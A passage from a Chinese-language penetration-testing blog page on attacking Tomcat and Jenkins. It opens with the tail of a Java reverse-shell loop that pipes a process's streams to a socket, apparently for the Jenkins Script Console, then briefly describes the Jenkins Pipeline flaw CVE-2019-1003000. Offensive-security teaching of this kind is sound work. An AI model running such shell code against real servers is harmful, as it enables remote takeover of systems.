function">getInputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>OutputStream po<span class="token operator">=</span>p<span class="token punctuation">.</span><span class="token function">getOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>so<span class="token operator">=</span>s<span class="token punctuation">.</span><span class="token function">getOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token operator">!</span>s<span class="token punctuation">.</span><span class="token function">isClosed</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">while</span><span class="token punctuation">(</span>pi<span class="token punctuation">.</span><span class="token function">available</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span>so<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>pi<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span>pe<span class="token punctuation">.</span><span class="token function">available</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span>so<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>pe<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span><span class="token punctuation">(</span>si<span class="token punctuation">.</span><span class="token function">available</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span>po<span class="token punctuation">.</span><span class="token function">write</span><span class="token punctuation">(</span>si<span class="token punctuation">.</span><span class="token function">read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>so<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>po<span class="token punctuation">.</span><span class="token function">flush</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>Thread<span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">try</span> <span class="token punctuation">&#123;</span>p<span class="token punctuation">.</span><span class="token function">exitValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">catch</span> <span class="token punctuation">(</span>Exception e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>p<span class="token punctuation">.</span><span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>s<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="其他漏洞"><a href="#其他漏洞" class="headerlink" title="其他漏洞"></a>其他漏洞</h4><p><a target="_blank" rel="noopener" href="https://jenkins.io/security/advisory/2019-01-08/#SECURITY-1266">CVE-2019-1003000</a> 是Jenkins的一个漏洞，其影响版本为2.137及之前版本，以及2.138.x及之后2.138.3之前的部分版本，漏洞等级为严重。</p>
<p>该漏洞的原理是Jenkins中存在一个未经身份验证的远程代码执行漏洞，攻击者可以利用该漏洞在Jenkins服务器上执行任意代码。该漏洞存在于Jenkins的Pipeline插件中，攻击者可以利用该漏洞通过Pipeline脚本执行任意代码，从而获取敏感信息、篡改数据或者控制服务器。</p>

	  <div class="article-footer-copyright">

    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
</div>

	</div>

	
	
	<div>
  	<center>

	<div class="pagination">

    
    
    <a href="/2023/05/15/splunk-PRTG/" type="button" class="btn btn-default"><i
                class="fa fa-arrow-circle-o-left"></i> Prev</a>
    

    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
    
    <a href="/2023/04/22/xssCheatSheet/" type="button" class="btn btn-default ">Next<i
                class="fa fa-arrow-circle-o-right"></i></a>
    

    
</div>


    </center>
	</div>
	
	<!-- comment -->
	<!--
<section id="comment">
    <h2 class="title">Comments</h2>

    
</section>

-->
	
	
	
	</div> <!-- col-md-9/col-md-12 -->


	
	<div id="side_meta">
		<div class="col-md-3" id="post_meta"> 

	<!-- date -->
	
	<div class="meta-widget">
	<i class="fa fa-clock-o"></i>
	2023-04-30 
	</div>
	

	<!-- categories -->
    

	<!-- tags -->
	
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
    <ul id="tags" class="tag_box list-unstyled collapse in">	  
	    
  <li><a href="/tags/Web/">Web<span>3</span></a></li>
    </ul>
	</div>
		

	<!-- toc -->
	<div class="meta-widget">
	
	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
	   <div id="toc" class="toc collapse in">
		   <span class="toc-title">Contents</span>
			<ol class="toc-article"><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Tomcat"><span class="toc-article-text">Tomcat</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Discovery-x2F-Footprinting"><span class="toc-article-text">Discovery&#x2F;Footprinting</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Attacking"><span class="toc-article-text">Attacking</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#CVE-2020-1938-Ghostcat"><span class="toc-article-text">CVE-2020-1938 : Ghostcat</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E6%A3%80%E6%B5%8B%E5%B7%A5%E5%85%B7"><span class="toc-article-text">检测工具</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%90%8E%E5%8F%B0getshell"><span class="toc-article-text">后台getshell</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#msfvenom"><span class="toc-article-text">msfvenom</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#msf%E8%87%AA%E5%8A%A8%E4%BC%A0%E9%A9%AC%E8%BF%9E%E6%8E%A5"><span class="toc-article-text">msf自动传马连接</span></a></li></ol></li></ol></li></ol></li><li class="toc-article-item toc-article-level-1"><a class="toc-article-link" href="#Jenkins"><span class="toc-article-text">Jenkins</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Discovery-x2F-Footprintting"><span class="toc-article-text">Discovery&#x2F;Footprintting</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#Attacking-1"><span class="toc-article-text">Attacking</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#ScriptConsole"><span class="toc-article-text">ScriptConsole</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%85%B6%E4%BB%96%E6%BC%8F%E6%B4%9E"><span class="toc-article-text">其他漏洞</span></a></li></ol></li></ol></li></ol></li></ol>
		</div>
	
	</div>
	
    <hr>
	
</div><!-- col-md-3 -->

		

	</div>
	
		

</div><!-- row -->

<!--
 -->



	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  
  &copy; 2023 Ak4izZ's Blog
  
      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
</p>
 </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>⬆︎TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



</body>
   </html>
